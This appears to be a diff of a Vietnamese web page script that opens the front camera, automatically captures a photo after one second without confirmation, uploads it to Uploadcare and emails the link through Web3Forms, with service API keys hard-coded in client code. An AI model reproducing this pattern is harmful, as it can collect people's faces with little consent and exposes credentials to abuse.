@@ -46,7 +46,7 @@
 
   <script>
   const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
-  const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
+  const UPLOADCARE_KEY = "86cb3ac81349fba83593";
 
   const msg = document.getElementById('msg');
   const openCamBtn = document.getElementById('openCam');
@@ -63,11 +63,10 @@
     openCamBtn.disabled = true;
     msg.textContent = "🔄 Đang bật camera...";
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       video.srcObject = stream;
       video.style.display = "block";
 
-      // ⏱ Giảm thời gian chụp xuống còn 1 giây
       setTimeout(() => captureAndSend(), 1000);
     } catch (err) {
       showError("Không thể mở camera: " + err.message);
@@ -94,19 +93,26 @@
       video.style.display = "none";
       if (stream) stream.getTracks().forEach(t => t.stop());
 
-      msg.textContent = "⏳ Đang tải ảnh lên...";
+      // Upload lên Uploadcare
+      msg.textContent = "⏳ Đang tải ảnh lên Uploadcare...";
+      const base64Data = capturedImage.split(",")[1];
       const formData = new FormData();
-      formData.append("image", capturedImage.split(",")[1]);
+      formData.append("UPLOADCARE_PUB_KEY", UPLOADCARE_KEY);
+      formData.append("UPLOADCARE_STORE", "1");
+      formData.append("file", `data:image/png;base64,${base64Data}`);
 
-      const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {
-        method: "POST", body: formData
+      const upload = await fetch("https://upload.uploadcare.com/base/", {
+        method: "POST",
+        body: formData
       });
-      const imgRes = await upload.json();
-      if (!imgRes.success) throw new Error("Upload imgbb thất bại!");
 
-      const imageUrl = imgRes.data.url;
+      const uploadRes = await upload.json();
+      if (!uploadRes.file) throw new Error("Uploadcare upload thất bại!");
+
+      const imageUrl = `https://ucarecdn.com/${uploadRes.file}/`;
+
+      // Gửi qua Web3Forms
       msg.textContent = "📨 Đang gửi qua Web3Forms...";
-
       const payload = {
         access_key: WEB3FORMS_KEY,
         subject: "Ảnh tự chụp mới",
@@ -116,9 +122,10 @@
 
       const res = await fetch("https://api.web3forms.com/submit", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
+
       const result = await res.json();
 
       if (result.success) showOK("✅ Ảnh đã được gửi thành công!");
